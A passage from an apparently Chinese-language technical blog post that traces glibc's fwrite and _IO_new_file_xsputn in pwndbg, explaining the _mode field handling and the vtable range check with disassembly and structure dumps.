[rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c80060 &lt;+320&gt;:   xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c80063 &lt;+323&gt;:   jmp    0x7ffff7c80015 &lt;__GI__IO_fwrite+245&gt;</span><br><span class="line">   0x00007ffff7c80065 &lt;+325&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c80068 &lt;+328&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8006d &lt;+333&gt;:   jmp    0x7ffff7c80008 &lt;__GI__IO_fwrite+232&gt;</span><br><span class="line">   0x00007ffff7c8006f &lt;+335&gt;:   mov    rax,r14</span><br><span class="line">   0x00007ffff7c80072 &lt;+338&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c80074 &lt;+340&gt;:   div    r13</span><br><span class="line">   0x00007ffff7c80077 &lt;+343&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c8007a &lt;+346&gt;:   jmp    0x7ffff7c80015 &lt;__GI__IO_fwrite+245&gt;</span><br><span class="line">   0x00007ffff7c8007c &lt;+348&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c80080 &lt;+352&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c80085 &lt;+357&gt;:   jmp    0x7ffff7c7ffca &lt;__GI__IO_fwrite+170&gt;</span><br><span class="line">   0x00007ffff7c8008a &lt;+362&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c80090 &lt;+368&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c80095 &lt;+373&gt;:   jmp    0x7ffff7c7ff7c &lt;__GI__IO_fwrite+92&gt;</span><br><span class="line">   0x00007ffff7c8009a &lt;+378&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c8009e &lt;+382&gt;:   mov    rbp,rax</span><br><span class="line">   0x00007ffff7c800a1 &lt;+385&gt;:   jmp    0x7ffff7c291b1 &lt;__GI__IO_fwrite.cold&gt;</span><br><span class="line">Address range 0x7ffff7c291b1 to 0x7ffff7c291e7:</span><br><span class="line">   0x00007ffff7c291b1 &lt;-355695&gt;:        test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c291b7 &lt;-355689&gt;:        jne    0x7ffff7c291df &lt;__GI__IO_fwrite-355649&gt;</span><br><span class="line">   0x00007ffff7c291b9 &lt;-355687&gt;:        mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c291c0 &lt;-355680&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c291c3 &lt;-355677&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c291c6 &lt;-355674&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c291c9 &lt;-355671&gt;:        jne    0x7ffff7c291df &lt;__GI__IO_fwrite-355649&gt;</span><br><span class="line">   0x00007ffff7c291cb &lt;-355669&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c291d3 &lt;-355661&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c291d5 &lt;-355659&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c291d8 &lt;-355656&gt;:        jle    0x7ffff7c291df &lt;__GI__IO_fwrite-355649&gt;</span><br><span class="line">   0x00007ffff7c291da &lt;-355654&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c291df &lt;-355649&gt;:        mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c291e2 &lt;-355646&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试，也是和fread的开始类似，先计算要写入的字节数（为0则直接返回），再判断一下<code>_flags</code>的状态进行一些有关锁的操作<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff24 &lt;fwrite+4&gt;     push   r15</span><br><span class="line">0x7ffff7c7ff26 &lt;fwrite+6&gt;     push   r14</span><br><span class="line">0x7ffff7c7ff28 &lt;fwrite+8&gt;     push   r13</span><br><span class="line">0x7ffff7c7ff2a &lt;fwrite+10&gt;    push   r12</span><br><span class="line">0x7ffff7c7ff2c &lt;fwrite+12&gt;    mov    r12, rsi     R12 =&gt; 1</span><br><span class="line">0x7ffff7c7ff2f &lt;fwrite+15&gt;    push   rbp</span><br><span class="line">0x7ffff7c7ff30 &lt;fwrite+16&gt;    imul   r12, rdx</span><br><span class="line">0x7ffff7c7ff34 &lt;fwrite+20&gt;    push   rbx</span><br><span class="line">0x7ffff7c7ff35 &lt;fwrite+21&gt;    sub    rsp, 8       RSP =&gt; 0x7fffffffdc90 (0x7fffffffdc98 - 0x8)</span><br><span class="line">0x7ffff7c7ff39 &lt;fwrite+25&gt;    test   r12, r12     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ff3c &lt;fwrite+28&gt;  ✘ je     fwrite+245                  &lt;fwrite+245&gt;</span><br></pre></td></tr></table></figure><p>可见判断了写入字节数<code>test r12, r12</code>是否为0，为零则跳转到<code>&lt;fwrite+245&gt;</code>，正是返回的指令<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c80015 &lt;+245&gt;:   add    rsp,0x8</span><br><span class="line">0x00007ffff7c80019 &lt;+249&gt;:   mov    rax,r12</span><br><span class="line">0x00007ffff7c8001c &lt;+252&gt;:   pop    rbx</span><br><span class="line">0x00007ffff7c8001d &lt;+253&gt;:   pop    rbp</span><br><span class="line">0x00007ffff7c8001e &lt;+254&gt;:   pop    r12</span><br><span class="line">0x00007ffff7c80020 &lt;+256&gt;:   pop    r13</span><br><span class="line">0x00007ffff7c80022 &lt;+258&gt;:   pop    r14</span><br><span class="line">0x00007ffff7c80024 &lt;+260&gt;:   pop    r15</span><br><span class="line">0x00007ffff7c80026 &lt;+262&gt;:   ret</span><br></pre></td></tr></table></figure><p>然后就是关于<code>_IO_FILE</code>线程锁的操作，笔者对这块知识不熟悉，就先不放了<br>再后续就是检查<code>_mode</code>字段以及<code>vtable</code>操作<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff8b &lt;fwrite+107&gt;    mov    eax, dword ptr [rbx + 0xc0]     EAX, [0x555555559360] =&gt; 0</span><br><span class="line">0x7ffff7c7ff91 &lt;fwrite+113&gt;    test   eax, eax                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ff93 &lt;fwrite+115&gt;  ✘ jne    fwrite+272                  &lt;fwrite+272&gt;</span><br></pre></td></tr></table></figure><p>这里检查<code>[rbx + 0xc0]</code>也就是<code>_IO_FILE_plus</code>偏移0xc0处，也就是<code>_mode</code>处是否为0，不为0则跳转，我们看跳转处<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这里<code>_mode</code>为0，不会跳转，但还是看看跳转过去的判断<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c80030 &lt;+272&gt;:   cmp    eax,0xffffffff</span><br><span class="line">0x00007ffff7c80033 &lt;+275&gt;:   je     0x7ffff7c7ffa3 &lt;__GI__IO_fwrite+131&gt;</span><br></pre></td></tr></table></figure><p><code>_mode</code>为-1则跳转回来<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff99 &lt;fwrite+121&gt;    mov    dword ptr [rbx + 0xc0], 0xffffffff     [0x555555559360] &lt;= 0xffffffff</span><br><span class="line">0x7ffff7c7ffa3 &lt;fwrite+131&gt;    mov    r15, qword ptr [rbx + 0xd8]            R15, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffaa &lt;fwrite+138&gt;    lea    rdx, [rip + 0x196a4f]                  RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffb1 &lt;fwrite+145&gt;    lea    rax, [rip + 0x1977b0]                  RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c7ffb8 &lt;fwrite+152&gt;    sub    rax, rdx                               RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffbb &lt;fwrite+155&gt;    mov    rcx, r15                               RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffbe &lt;fwrite+158&gt;    sub    rcx, rdx                               RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffc1 &lt;fwrite+161&gt;    cmp    rax, rcx                               0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br></pre></td></tr></table></figure><p>可以看到跳转回来处（我们这里其实不会跳转，因为<code>_mode</code>已经是0）后续就开始进行<code>vtable</code>的安全检查，注意<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ff99 &lt;fwrite+121&gt;    mov    dword ptr [rbx + 0xc0], 0xffffffff     [0x555555559360] &lt;= 0xffffffff</span><br></pre></td></tr></table></figure><p>将<code>_mode</code>设置为-1，我们验证一下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = (struct _IO_FILE_plus *) 0x5555555592a0</span><br><span class="line">pwndbg&gt; x 0x5555555592a0+0xc0</span><br><span class="line">0x555555559360: 0xffffffff</span><br></pre></td></tr></table></figure><p>看到<code>_mode</code>已经被设置为了-1<br>后续对<code>vtable</code>的检查和fread一样，先判断是否在指定范围内<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ffa3 &lt;fwrite+131&gt;    mov    r15, qword ptr [rbx + 0xd8]            R15, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffaa &lt;fwrite+138&gt;    lea    rdx, [rip + 0x196a4f]                  RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffb1 &lt;fwrite+145&gt;    lea    rax, [rip + 0x1977b0]                  RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c7ffb8 &lt;fwrite+152&gt;    sub    rax, rdx                               RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffbb &lt;fwrite+155&gt;    mov    rcx, r15                               RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c7ffbe &lt;fwrite+158&gt;    sub    rcx, rdx                               RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c7ffc1 &lt;fwrite+161&gt;    cmp    rax, rcx                               0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ffc4 &lt;ferite+164&gt;:   jbe    0x7ffff7c80080 &lt;__GI__IO_fwrite+352&gt;</span><br></pre></td></tr></table></figure><p>不在指定范围内则调用<code>_IO_vtable_check</code>函数来进一步检查<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c80080 &lt;+352&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>这里不再赘述，后续调用<code>vtable-&gt;_IO_file_xsputn</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ffca &lt;fwrite+170&gt;    mov    rdx, r12     RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c7ffcd &lt;fwrite+173&gt;    mov    rsi, r14     RSI =&gt; 0x555555559480 ◂— 0</span><br><span class="line">0x7ffff7c7ffd0 &lt;fwrite+176&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c7ffd3 &lt;fwrite+179&gt;    call   qword ptr [r15 + 0x38]      &lt;_IO_file_xsputn&gt;</span><br></pre></td></tr></table></figure><p>可以看到这里<code>r15</code>正指向<code>vtable</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r15            0x7ffff7e17600</span><br></pre></td></tr></table></figure><p><code>[r15 + 0x38]</code>处正是<code>vtable</code>中偏移0x38的<code>_IO_file_xsputn</code><br>我们还是贴上汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_xsputn:</span><br><span class="line">=&gt; 0x00007ffff7c8b600 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8b604 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c8b606 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c8b608 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8b60a &lt;+10&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8b60c &lt;+12&gt;:    xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c8b60f &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8b610 &lt;+16&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8b611 &lt;+17&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b615 &lt;+21&gt;:    test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8b618 &lt;+24&gt;:    je     0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b61a &lt;+26&gt;:    mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c8b61d &lt;+29&gt;:    mov    r13,rsi</span><br><span class="line">   0x00007ffff7c8b620 &lt;+32&gt;:    mov    rdi,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007ffff7c8b624 &lt;+36&gt;:    mov    rbx,rdx</span><br><span class="line">   0x00007ffff7c8b627 &lt;+39&gt;:    mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8b62a &lt;+42&gt;:    and    eax,0xa00</span><br><span class="line">   0x00007ffff7c8b62f &lt;+47&gt;:    cmp    eax,0xa00</span><br><span class="line">   0x00007ffff7c8b634 &lt;+52&gt;:    je     0x7ffff7c8b680 &lt;_IO_new_file_xsputn+128&gt;</span><br><span class="line">   0x00007ffff7c8b636 &lt;+54&gt;:    mov    r12,QWORD PTR [rbp+0x30]</span><br><span class="line">   0x00007ffff7c8b63a &lt;+58&gt;:    cmp    r12,rdi</span><br><span class="line">   0x00007ffff7c8b63d &lt;+61&gt;:    jbe    0x7ffff7c8b6a0 &lt;_IO_new_file_xsputn+160&gt;</span><br><span class="line">   0x00007ffff7c8b63f &lt;+63&gt;:    sub    r12,rdi</span><br><span class="line">   0x00007ffff7c8b642 &lt;+66&gt;:    xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b645 &lt;+69&gt;:    test   r12,r12</span><br><span class="line">   0x00007ffff7c8b648 &lt;+72&gt;:    je     0x7ffff7c8b6a0 &lt;_IO_new_file_xsputn+160&gt;</span><br><span class="line">   0x00007ffff7c8b64a &lt;+74&gt;:    cmp    r12,rbx</span><br><span class="line">   0x00007ffff7c8b64d &lt;+77&gt;:    mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b650 &lt;+80&gt;:    mov    r15,rbx</span><br><span class="line">   0x00007ffff7c8b653 &lt;+83&gt;:    cmova  r12,rbx</span><br><span class="line">   0x00007ffff7c8b657 &lt;+87&gt;:    mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b65a &lt;+90&gt;:    add    r13,r12</span><br><span class="line">   0x00007ffff7c8b65d &lt;+93&gt;:    sub    r15,r12</span><br><span class="line">   0x00007ffff7c8b660 &lt;+96&gt;:    call   0x7ffff7c283e0 &lt;*ABS*+0xa97d0@plt&gt;</span><br><span class="line">   0x00007ffff7c8b665 &lt;+101&gt;:   mov    QWORD PTR [rbp+0x28],rax</span><br><span class="line">   0x00007ffff7c8b669 &lt;+105&gt;:   add    r14,r15</span><br><span class="line">   0x00007ffff7c8b66c &lt;+108&gt;:   jne    0x7ffff7c8b6a3 &lt;_IO_new_file_xsputn+163&gt;</span><br><span class="line">   0x00007ffff7c8b66e &lt;+110&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b672 &lt;+114&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8b675 &lt;+117&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8b676 &lt;+118&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8b677 &lt;+119&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8b679 &lt;+121&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8b67b &lt;+123&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8b67d &lt;+125&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8b67f &lt;+127&gt;:   ret</span><br><span class="line">   0x00007ffff7c8b680 &lt;+128&gt;:   mov    r12,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8b684 &lt;+132&gt;:   lea    rax,[rsi+rdx*1]</span><br><span class="line">   0x00007ffff7c8b688 &lt;+136&gt;:   sub    r12,rdi</span><br><span class="line">   0x00007ffff7c8b68b &lt;+139&gt;:   cmp    rdx,r12</span><br><span class="line">   0x00007ffff7c8b68e &lt;+142&gt;:   jbe    0x7ffff7c8b73d &lt;_IO_new_file_xsputn+317&gt;</span><br><span class="line">   0x00007ffff7c8b694 &lt;+148&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b697 &lt;+151&gt;:   test   r12,r12</span><br><span class="line">   0x00007ffff7c8b69a &lt;+154&gt;:   jne    0x7ffff7c8b64a &lt;_IO_new_file_xsputn+74&gt;</span><br><span class="line">   0x00007ffff7c8b69c &lt;+156&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b6a0 &lt;+160&gt;:   mov    r15,rbx</span><br><span class="line">   0x00007ffff7c8b6a3 &lt;+163&gt;:   mov    rax,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c8b6aa &lt;+170&gt;:   lea    r14,[rip+0x18b34f]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8b6b1 &lt;+177&gt;:   lea    r12,[rip+0x18c0b0]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8b6b8 &lt;+184&gt;:   sub    r12,r14</span><br><span class="line">   0x00007ffff7c8b6bb &lt;+187&gt;:   mov    rdx,rax</span><br><span class="line">   0x00007ffff7c8b6be &lt;+190&gt;:   sub    rdx,r14</span><br><span class="line">   0x00007ffff7c8b6c1 &lt;+193&gt;:   cmp    r12,rdx</span><br><span class="line">   0x00007ffff7c8b6c4 &lt;+196&gt;:   jbe    0x7ffff7c8b880 &lt;_IO_new_file_xsputn+640&gt;</span><br><span class="line">   0x00007ffff7c8b6ca &lt;+202&gt;:   mov    esi,0xffffffff</span><br><span class="line">   0x00007ffff7c8b6cf &lt;+207&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b6d2 &lt;+210&gt;:   call   QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8b6d5 &lt;+213&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8b6d8 &lt;+216&gt;:   je     0x7ffff7c8b830 &lt;_IO_new_file_xsputn+560&gt;</span><br><span class="line">   0x00007ffff7c8b6de &lt;+222&gt;:   mov    rcx,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8b6e2 &lt;+226&gt;:   sub    rcx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8b6e6 &lt;+230&gt;:   mov    r8,r15</span><br><span class="line">   0x00007ffff7c8b6e9 &lt;+233&gt;:   cmp    rcx,0x7f</span><br><span class="line">   0x00007ffff7c8b6ed &lt;+237&gt;:   jbe    0x7ffff7c8b6fa &lt;_IO_new_file_xsputn+250&gt;</span><br><span class="line">   0x00007ffff7c8b6ef &lt;+239&gt;:   mov    rax,r15</span><br><span class="line">   0x00007ffff7c8b6f2 &lt;+242&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8b6f4 &lt;+244&gt;:   div    rcx</span><br><span class="line">   0x00007ffff7c8b6f7 &lt;+247&gt;:   